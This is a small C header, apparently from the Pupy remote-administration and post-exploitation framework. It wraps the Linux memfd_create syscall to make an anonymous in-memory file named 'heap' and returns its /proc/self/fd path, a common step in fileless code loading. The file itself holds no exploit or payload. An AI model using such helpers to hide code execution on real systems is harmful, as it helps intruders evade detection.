#ifndef _PUPY_MEMFD_H
#define _PUPY_MEMFD_H

#define _GNU_SOURCE
#include <sys/syscall.h>

#define MFD_CLOEXEC			0x0001U
#define MFD_ALLOW_SEALING	0x0002U

#ifndef __NR_memfd_create
 #ifdef __x86_64__
  #define __NR_memfd_create 319
 #elif __i386__
  #define __NR_memfd_create 356
 #endif
#endif

inline static int pupy_memfd_create(char *path, unsigned int path_size)
{
	int fd = syscall(__NR_memfd_create, "heap", MFD_CLOEXEC | MFD_ALLOW_SEALING);
	if (fd == -1) {
		return -1;
	}

	snprintf(path, path_size, "/proc/self/fd/%d", fd);
	return fd;
}

#endif
